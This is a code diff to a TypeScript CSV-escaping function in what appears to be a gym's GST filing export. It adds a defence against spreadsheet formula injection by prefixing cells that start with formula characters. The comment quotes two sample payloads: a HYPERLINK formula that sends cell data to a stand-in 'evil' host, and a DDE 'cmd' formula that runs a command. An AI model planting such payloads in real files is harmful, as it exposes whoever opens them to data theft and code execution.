@@ -128,7 +128,18 @@ function quarterToDateRange(quarter: 1 | 2 | 3 | 4, year: number): {
 }
 
 function csvEscape(value: unknown): string {
-  const s = String(value ?? "");
+  let s = String(value ?? "");
+  // PR 13 audit fix (CRITICAL): formula-injection prophylaxis (CWE-1236).
+  // GSTR-1 CSVs are routinely re-opened in Excel / Google Sheets / LibreOffice
+  // by the gym's CA. A customer name like `=HYPERLINK("http://evil/?c="&A1)`
+  // or `=cmd|'/C calc'!A1` would execute on open. Per OWASP guidance, prefix
+  // any cell whose first character is one of `= + - @ \t \r` with a single
+  // quote so spreadsheet apps treat it as text. The leading apostrophe is
+  // not part of the rendered value in the spreadsheet but does add a byte
+  // to the CSV — acceptable trade-off for filings that ship to third parties.
+  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
+    s = `'${s}`;
+  }
   if (s.includes(",") || s.includes('"') || s.includes("\n")) {
     return `"${s.replace(/"/g, '""')}"`;
   }
